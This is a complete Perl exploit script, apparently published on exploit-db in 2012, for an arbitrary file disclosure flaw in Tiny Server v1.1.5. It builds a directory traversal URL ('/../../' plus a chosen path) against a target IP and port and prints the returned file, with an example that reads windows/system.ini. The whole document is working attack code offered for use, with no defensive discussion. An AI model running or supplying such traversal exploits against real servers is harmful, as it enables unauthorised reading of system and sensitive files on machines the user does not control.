#!/usr/bin/perl -w
#Title  : Tiny Server v1.1.5 Arbitrary File Disclosure Exploit
#Author : KaHPeSeSe
#Test   : PERFECT XP PC1 / SP3
#Date   : 15/03/2012
#Thanks : exploit-db.com
use LWP::Simple;
use LWP::UserAgent;
    system('color','A');
    system('cls');
            print "\n\t____________________________________________________________________\n";
            print "\n\t....... Tiny Server v1.1.5 Arbitrary File Disclosure Exploit .......\n";
            print "\n\t....... Founded and Exploited by KaHPeSeSe                   .......\n";
            print "\n\t____________________________________________________________________\n\n";
    if(@ARGV < 3)
        {
            print "[-] Error!\n";
            print "[-] Look to example\n\n";
            &help; exit();
                                            }
    sub help()
        {
            print "[+] How  to : perl $0 IP Port File\n";
            print "[+] Example : perl $0 192.168.1.2 80 windows/system.ini\n";
                                            }
            ($TargetIP, $Port, $File) = @ARGV;
            print("Connet to Server.... \n");
            sleep(2);
            $path="/../../";
            my $link = "http://" . $TargetIP . ":" . $Port . $path . $File;
            print("Connected\n");
            sleep(2);
            print("Waiting for moment\n");
            sleep(1);
            print("Done! Reading $File...\n");
            sleep(3);
            $ourfile=get $link;
    if($ourfile)
        {
            print("\n\n____________________________________________________\n\n");
            print("$ourfile \n\n");
            print("_____________________________________________________\n\n");
                                            }
    else
    {
            print("_____________________________________________________\n\n");
            print(" Not Found !!!\n\n");
            print("_____________________________________________________\n\n");
            exit;
                                            }
